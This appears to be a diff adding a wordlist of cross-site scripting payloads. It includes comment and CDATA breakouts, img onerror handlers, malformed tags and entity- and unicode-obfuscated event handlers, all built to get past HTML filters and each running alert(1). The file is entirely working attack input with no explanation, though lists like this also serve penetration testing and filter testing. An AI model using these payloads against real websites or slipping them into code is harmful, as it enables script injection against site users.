@@ -1,0 +1,11 @@
+![CDATA[><img src="x" onerror="alert(1)">]]>
+!--><img src="x" onerror="alert(1)">-->
+!----><img src="x" onerror="alert(1)">--&gt;
+1;><x:!µ!:x\/style=‘b&#x5c;65h\0061vio\r:url(#def&#x61ult#time2)’/onbegin=\u00&#54;1lert&#40&#x31)&#x2f/&xyz\>
+<L:µ onclick=alert(1)>click me</L:µ>
+."><img/ \/\µ src=x onerror=alert(1)//>
+"><img/ \/\µ/src=x onerror=alert(1)//>
+"><img/\/\µ/src=x onerror=alert(1)//>
+"><img/ \/\µ/""src=x onerror=alert(1)//>
+"><img/\/\µ/""src=x onerror=alert(1)//>
+<img/x="/\'"'src='x'"'/\"onerror=alert(1)//\
